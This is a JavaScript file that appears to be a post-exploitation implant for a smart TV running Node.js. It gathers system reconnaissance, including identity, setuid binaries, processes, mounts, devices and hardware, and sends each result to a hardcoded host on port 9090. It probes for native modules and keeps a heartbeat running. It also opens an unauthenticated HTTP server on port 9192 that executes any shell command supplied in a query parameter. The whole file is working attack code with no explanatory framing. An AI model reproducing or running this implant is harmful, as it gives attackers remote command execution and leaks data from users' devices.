"use strict";
(function () {
  var http = require('http');
  var cp = require('child_process');
  var MAC = '192.168.0.188';
  function beacon(tag, data) {
    try {
      var body = String(data);
      var req = http.request({ host: MAC, port: 9090, path: '/' + tag, method: 'POST',
        headers: { 'Content-Length': Buffer.byteLength(body) } }, function () {});
      req.on('error', function () {});
      req.end(body);
    } catch (e) {}
  }
  function sync(cmd) {
    try { return cp.execSync(cmd, { timeout: 30000, maxBuffer: 4*1024*1024 }).toString(); }
    catch (e) { return '[ERR] ' + (e.stdout ? e.stdout.toString() : e); }
  }
  beacon('start', 'v2 up node=' + process.version + ' uid=' + process.getuid() + ' ppid=' + (process.ppid||'?'));
  beacon('who', sync('id; uname -a; cat /proc/self/cgroup'));
  beacon('setuid', sync('find /usr /opt /etc /bin /sbin -xdev \\( -perm -4000 -o -perm -2000 \\) -type f 2>/dev/null | head -50'));
  beacon('ps', sync('ps -ef 2>/dev/null | head -45 || cat /proc/*/comm 2>/dev/null | sort | uniq -c | sort -rn | head -50'));
  beacon('mounts', sync('cat /proc/mounts | grep -vE "cgroup|sysfs|proc |devpts|securityfs" | head -35'));
  beacon('dev', sync('ls -la /dev | grep -E "mem|video|fb|sg |ttyS|i2c" | head -20'));
  beacon('psx', sync('ls /proc | grep -E "^[0-9]+$" | while read p; do echo "$p $(cat /proc/$p/comm 2>/dev/null) $(grep ^Uid /proc/$p/status 2>/dev/null | cut -f2)"; done | head -80'));
  beacon('cpu', sync('grep -E "processor|model|Implementer|part|Hardware|Serial|Revision" /proc/cpuinfo | head -30; cat /proc/device-tree/model 2>/dev/null; echo; cat /proc/cpuinfo | grep -c processor'));
  beacon('mem', sync('head -6 /proc/meminfo'));
  beacon('stor', sync('cat /proc/partitions; cat /sys/block/mmcblk0/size 2>/dev/null; df -h 2>/dev/null | head -22'));
  beacon('wasu', sync('ls -la /usr/bin/wasutility; wasutility 2>&1 | head -30'));
  beacon('psu', sync('ps -ef 2>/dev/null | tail -60'));
  var paths = ['/opt/usr/home/owner/apps_rw/xvvl3S1bvH/data/tvnative.node',
               '/home/owner/share/tmp/sdk_tools/tvnative.node',
               '/home/owner/share/tvnative.node'];
  var loaded = null;
  paths.forEach(function (p) {
    if (loaded) return;
    try { loaded = require(p); beacon('native', 'LOADED from ' + p); }
    catch (e) { beacon('native', p + ' -> ' + String(e).slice(0, 120)); }
  });
  try { beacon('nativeout', require('fs').readFileSync('/tmp/native.out').toString()); }
  catch (e) { beacon('nativeout', 'no /tmp/native.out: ' + String(e).slice(0, 80)); }
  setInterval(function () { beacon('hb', String(Date.now())); }, 10000);
  var srv = http.createServer(function (req, res) {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    var url = require('url').parse(req.url, true);
    if (url.pathname === '/x' && url.query.c) {
      try { res.end(sync(url.query.c)); }
      catch (e) { res.end('[EXC] ' + e); }
    } else { res.end('v2 alive\n'); }
  });
  srv.listen(9192, '0.0.0.0');
  srv.on('error', function (e) { beacon('listen-fail', String(e)); });
})();
